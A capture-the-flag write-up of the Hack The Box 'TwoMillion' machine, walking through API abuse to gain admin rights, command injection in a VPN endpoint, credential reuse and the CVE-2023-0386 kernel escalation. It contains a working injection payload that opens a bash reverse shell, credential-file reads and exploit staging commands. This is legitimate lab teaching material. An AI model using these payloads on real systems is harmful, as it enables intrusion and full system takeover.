---
title: "HTB TwoMillion Writeup"
summary: "Linux writeup covering API enumeration, broken access control, command injection in VPN generation, and CVE-2023-0386 kernel privilege escalation."
date: 2026-06-19
tags:
  - htb
  - linux
  - web
  - api
  - command-injection
  - kernel-exploit
  - recon
category: "hack-the-box"
difficulty: "easy"
platform: "hackthebox"
boxImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d7bc2758fb7589dfa046bee9ce4d75cb.png"
draft: false
---

# Hack The Box — TwoMillion Writeup

|---|
|Machine|TwoMillion|
|Platform|Hack The Box|
|OS|Linux / Ubuntu 22.04.2 LTS|
|Difficulty|Easy|
|Target IP|`10.129.229.66`|

TwoMillion exposed only SSH and a PHP/nginx web application. The attack path was API-focused: generate an invite code, register a user, abuse a broken admin settings endpoint to promote the account, exploit command injection in VPN generation for a shell, reuse leaked credentials from `.env`, then escalate to root through CVE-2023-0386 OverlayFS/FUSE local privilege escalation.

![TwoMillion Machine](/images/writeups/hackthebox/twomillion/twomillion-machine.png)

---

## Enumeration

### Host Discovery

The target was reachable over the HTB VPN.

```bash
ping 10.129.229.66
```

Output:

```text
64 bytes from 10.129.229.66: icmp_seq=1 ttl=63 time=15.5 ms
64 bytes from 10.129.229.66: icmp_seq=2 ttl=63 time=19.0 ms
64 bytes from 10.129.229.66: icmp_seq=3 ttl=63 time=47.5 ms
```

My VPN interface was:

```text
tun0: 10.10.14.224/23
```

This IP was later used for the reverse shell listener.

---

### Full Port Scan

```bash
sudo nmap -p- --min-rate 5000 -sS -Pn -oN nmap-allports.txt 10.129.229.66
```

Output:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only SSH and HTTP were exposed.

---

### Service Detection

```bash
sudo nmap -sC -sV -p22,80 -oN nmap-services.txt 10.129.229.66
```

Output:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
```

Critical findings:

- Port `80` redirected to `http://2million.htb/`

- Web stack: `nginx` with PHP sessions

- SSH was available but required credentials


I added the hostname to `/etc/hosts`:

```bash
echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts
```

---

### Web Fingerprinting

```bash
whatweb http://2million.htb
curl -I http://2million.htb
```

Output:

```text
http://2million.htb [200 OK] Cookies[PHPSESSID], HTTPServer[nginx], Script, Title[Hack The Box :: Penetration Testing Labs]
HTTP/1.1 405 Method Not Allowed
Set-Cookie: PHPSESSID=...
```

The `HEAD` request returned `405`, but normal `GET` requests worked.

---

### Link and JavaScript Enumeration

I saved the homepage and extracted links:

```bash
curl -s http://2million.htb/ -o index.html

grep -Eoi 'href="[^"]+|src="[^"]+' index.html | cut -d'"' -f2 | sort -u
```

Interesting paths:

```text
/invite
/login
/js/htb-frontpage.min.js
```

The `/invite` page loaded an additional JavaScript file:

```bash
curl -s http://2million.htb/invite | grep -Ei "script|api|invite|js"
```

Output:

```html
<script defer src="/js/inviteapi.min.js"></script>
url: '/api/v1/invite/verify'
```

I fetched the JavaScript:

```bash
curl -s http://2million.htb/js/inviteapi.min.js
```

The minified JavaScript revealed two important API endpoints:

```text
/api/v1/invite/verify
/api/v1/invite/how/to/generate
```

---

## Initial Foothold

### Invite Code Generation

The invite page required an invite code. The JavaScript exposed an API endpoint that explained how to generate one.

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

Output:

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

The message was ROT13 encoded:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate \
| jq -r '.data.data' \
| tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Decoded output:

```text
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

I generated an invite code:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
```

Output:

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "VVVZMjItWU1aUFEtUlNBM0wtQTNUMVk=",
    "format": "encoded"
  }
}
```

The code was base64 encoded:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate \
| jq -r '.data.code' | base64 -d; echo
```

Example decoded invite:

```text
4R4DA-W6HFR-ZWRMF-YM8NX
```

---

### User Registration

The registration form required:

```text
code
username
email
password
password_confirmation
```

This was confirmed by inspecting the form:

```bash
curl -s http://2million.htb/register \
| sed -n '/<form/,/<\/form>/p'
```

I registered a user using form-encoded data:

```bash
CODE=$(curl -s -X POST http://2million.htb/api/v1/invite/generate \
| jq -r '.data.code' | base64 -d)

curl -i -s -c cookies.txt -X POST http://2million.htb/api/v1/user/register \
--data-urlencode "code=$CODE" \
--data-urlencode "username=g10d5" \
--data-urlencode "email=g10d5@2million.htb" \
--data-urlencode "password=Password123@" \
--data-urlencode "password_confirmation=Password123@"
```

Successful registration redirected to `/login`:

```text
HTTP/1.1 302 Found
Location: /login
```

Then I logged in and saved the session cookie:

```bash
curl -i -s -b cookies.txt -c cookies.txt -X POST http://2million.htb/api/v1/user/login \
--data-urlencode "email=g10d5@2million.htb" \
--data-urlencode "password=Password123@"
```

Successful login redirected to `/home`:

```text
HTTP/1.1 302 Found
Location: /home
```

I confirmed authenticated access:

```bash
curl -i -s -b cookies.txt http://2million.htb/home | head -30
```

Output:

```html
<title>Hack The Box :: Dashboard </title>
```

---

### Authenticated API Enumeration

The authenticated API route list was accessible:

```bash
curl -s -b cookies.txt http://2million.htb/api/v1 | jq
```

Output:

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Critical findings:

- The route list exposed admin-only endpoints.

- There was an admin settings update endpoint.

- There was an admin VPN generation endpoint.


I checked my current role:

```bash
curl -s -b cookies.txt http://2million.htb/api/v1/user/auth | jq
```

Output:

```json
{
  "loggedin": true,
  "username": "g10d5",
  "is_admin": 0
}
```

The account was a normal user.

---

### API Privilege Escalation

The `/api/v1/admin/settings/update` endpoint allowed changing my own `is_admin` value without proper authorization.

```bash
curl -s -b cookies.txt -X PUT http://2million.htb/api/v1/admin/settings/update \
-H "Content-Type: application/json" \
-d '{"email":"g10d5@2million.htb","is_admin":1}' | jq
```

Output:

```json
{
  "id": 14,
  "username": "g10d5",
  "is_admin": 1
}
```

I verified admin access:

```bash
curl -s -b cookies.txt http://2million.htb/api/v1/admin/auth | jq
```

Output:

```json
{
  "message": true
}
```

Why it worked:

The application trusted user-supplied JSON input for account settings and allowed a regular authenticated user to set `is_admin` to `1`. This was a broken access control issue.

---

### Command Injection in VPN Generation

As an admin user, I tested the VPN generation endpoint:

```bash
curl -s -b cookies.txt -X POST http://2million.htb/api/v1/admin/vpn/generate \
-H "Content-Type: application/json" \
-d '{"username":"g10d5"}'
```

The endpoint generated an OpenVPN configuration.

To test command injection, I injected `id` into the `username` parameter:

```bash
curl -s -b cookies.txt -X POST http://2million.htb/api/v1/admin/vpn/generate \
-H "Content-Type: application/json" \
-d '{"username":"g10d5;id;"}'
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed command injection as the web server user.

Why it worked:

The backend likely passed the `username` value into a shell command during VPN profile generation without proper sanitization or argument escaping. By injecting semicolons, I was able to terminate the intended command and execute arbitrary commands.

---

### Reverse Shell

I started a listener on Kali:

```bash
nc -lvnp 4444
```

Then triggered a reverse shell through the vulnerable VPN endpoint:

```bash
curl -s -b cookies.txt -X POST http://2million.htb/api/v1/admin/vpn/generate \
-H "Content-Type: application/json" \
-d '{"username":"g10d5;bash -c '\''bash -i >& /dev/tcp/10.10.14.224/4444 0>&1'\'';"}'
```

Listener output:

```text
listening on [any] 4444 ...
connect to [10.10.14.224] from (UNKNOWN) [10.129.229.66] 43346
bash: cannot set terminal process group (1097): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$
```

Confirmed shell:

```bash
whoami
```

Output:

```text
www-data
```

---

## Privilege Escalation

### www-data to admin

From the web root, I listed files:

```bash
ls -la
```

Output:

```text
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Jun 19 11:40 VPN
```

The `.env` file contained database credentials:

```bash
cat .env
```

Output:

```ini
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

I checked local users:

```bash
cat /etc/passwd | grep -E '/bin/(bash|sh)$'
ls -la /home
```

Output:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```

Since there was a local user named `admin`, I tested credential reuse over SSH.

From Kali:

```bash
ssh admin@10.129.229.66
```

Password:

```text
SuperDuperPass123
```

Login succeeded.

I captured the user flag:

```bash
id
cat ~/user.txt
```

Output:

```text
uid=1000(admin) gid=1000(admin) groups=1000(admin)
8815f99973ac3718b6ffa3e4aa831873
```

Why it worked:

The database password from `.env` was reused as the Linux password for the `admin` user. This allowed lateral movement from the web service account to an interactive SSH account.

---

### admin to root

I checked sudo privileges and kernel version:

```bash
sudo -l
uname -a
lsb_release -a 2>/dev/null
```

Output:

```text
Sorry, user admin may not run sudo on localhost.
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 GNU/Linux
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.2 LTS
Release:        22.04
Codename:       jammy
```

The user had mail:

```bash
cat /var/mail/admin
```

Mail content:

```text
Subject: Urgent: Patch System OS

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

This pointed directly to an OverlayFS/FUSE kernel vulnerability.

The kernel version was vulnerable to CVE-2023-0386, a Linux kernel OverlayFS local privilege escalation caused by improper handling of setuid/capability copy-up from a `nosuid` mount into another mount.

---

### Staging the Exploit

The target had no outbound internet access:

```bash
git clone https://github.com/puckiestyle/CVE-2023-0386.git
```

Output:

```text
fatal: unable to access 'https://github.com/puckiestyle/CVE-2023-0386.git/': Could not resolve host: github.com
```

So I downloaded the exploit on Kali and transferred it to the target.

On Kali:

```bash
cd ~/Desktop
git clone https://github.com/puckiestyle/CVE-2023-0386.git
tar czf cve0386.tgz CVE-2023-0386

scp cve0386.tgz admin@10.129.229.66:/tmp/
```

On the target:

```bash
cd /tmp
tar xzf cve0386.tgz
cd CVE-2023-0386
make all
```

The build completed and produced:

```text
fuse
exp
gc
```

The target had the required build tools and FUSE helper:

```bash
which gcc make fusermount3
ls -l /usr/bin/fusermount3
```

Output:

```text
/usr/bin/gcc
/usr/bin/make
/usr/bin/fusermount3
-rwsr-xr-x 1 root root 35200 Mar 23  2022 /usr/bin/fusermount3
```

---

### Fixing Exploit Runtime Issue

The first exploit attempt failed because the copied payload file was empty or not executable:

```text
[+] exploit success!
sh: 1: ./ovlcap/upper/file: Permission denied
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

Inspection showed:

```bash
ls -l ./gc ./exp ./fuse ./ovlcap/upper/file
```

Output:

```text
-rwxrwxr-x 1 admin admin   17160 ./exp
-rwxrwxr-x 1 admin admin 1407736 ./fuse
-rwxrwxr-x 1 admin admin   16096 ./gc
-rw-rw-r-- 1 admin admin       0 ./ovlcap/upper/file
```

The issue was stale exploit directories and an incorrect setup. The PoC expects the `ovlcap/lower` mount path to be created by `./fuse`; manually creating it causes errors like:

```text
mkdir: File exists
```

I rebuilt in a clean directory:

```bash
pkill -f './fuse' 2>/dev/null
fusermount3 -u /tmp/CVE-2023-0386/ovlcap/lower 2>/dev/null
fusermount3 -u /home/admin/CVE-2023-0386/ovlcap/lower 2>/dev/null

cd /home/admin
rm -rf cve0386_clean
mkdir cve0386_clean
tar xzf /tmp/cve0386.tgz -C cve0386_clean --strip-components=1
cd cve0386_clean

make clean 2>/dev/null
make all

rm -rf ovlcap/lower ovlcap/upper ovlcap/work ovlcap/merge
```

Important:

```text
Do not manually create ovlcap/lower before running ./fuse.
```

---

### Exploiting CVE-2023-0386

The exploit required two SSH sessions.

#### Session 1

```bash
cd /home/admin/cve0386_clean
ls -ld ovlcap/lower 2>/dev/null || echo "lower does not exist"
./fuse ./ovlcap/lower ./gc
```

Expected output:

```text
lower does not exist
[+] len of gc: 0x3ee0
```

This session must remain running.

#### Session 2

```bash
cd /home/admin/cve0386_clean
./exp
```

Output:

```text
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun 19 12:04 .
drwxrwxr-x 6 root   root     4096 Jun 19 12:04 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
```

The exploit dropped into a root shell:

```bash
whoami
```

Output:

```text
root
```

I captured the root flag:

```bash
cd /root
cat root.txt
```

Output:

```text
e9b6293c6dec269eaf779767864f8fef
```

Why it worked:

CVE-2023-0386 abuses OverlayFS copy-up behavior involving a `nosuid` FUSE mount. The exploit causes a file with elevated privileges/capabilities to be copied into a writable overlay upper layer while preserving privilege attributes. Executing the copied file results in privilege escalation to root.

---

## Flags

```text
user.txt: 8815f99973ac3718b6ffa3e4aa831873
root.txt: e9b6293c6dec269eaf779767864f8fef
```

---

## Cleanup

After exploitation, I cleaned up the staged files and FUSE mount:

```bash
pkill -f './fuse' 2>/dev/null
fusermount3 -u /home/admin/cve0386_clean/ovlcap/lower 2>/dev/null
rm -rf /tmp/CVE-2023-0386 /home/admin/CVE-2023-0386 /home/admin/cve0386_clean /tmp/cve0386.tgz
```

---

## Key Takeaways

- JavaScript files can expose hidden API endpoints and application workflows.

- Encoding is not encryption; ROT13 and base64 were used only as weak obfuscation.

- Authenticated API route disclosure can reveal high-value admin functionality.

- Broken access control allowed a normal user to promote their own account to admin.

- Command injection can appear in backend automation features such as VPN/profile generation.

- `.env` files in web roots often contain reusable secrets.

- Password reuse between application/database credentials and Linux accounts enables lateral movement.

- Local kernel privilege escalation becomes practical when the target kernel is outdated and exploit hints exist on-box.

- For CVE-2023-0386, exploit setup matters: stale OverlayFS/FUSE directories can cause false failures.
